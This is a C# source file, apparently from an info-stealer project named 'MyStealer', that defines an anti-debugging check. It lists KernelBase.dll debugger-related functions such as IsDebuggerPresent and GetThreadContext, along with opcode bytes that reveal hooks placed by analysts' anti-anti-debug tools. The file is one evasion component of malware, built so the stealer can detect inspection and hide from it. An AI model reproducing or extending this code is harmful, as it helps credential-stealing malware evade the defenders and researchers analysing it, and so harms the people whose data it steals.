﻿namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
{
    internal class KernelBaseCheck : HookCheckBase
    {
        public override string Name => "Hooking: KernelBase";

        protected override string DllName => "KernelBase.dll";

        protected override string[] ProcNames => new string[]
        {
            "IsDebuggerPresent",
            "CheckRemoteDebuggerPresent",
            "GetThreadContext",
            "CloseHandle",
            "OutputDebugStringA",
            "OutputDebugStringW",
            "GetTickCount",
            "SetHandleInformation"
        };

        protected override byte[] BadOpCodes => new byte[] { 255, 0x90, 0xE9 };
    }
}
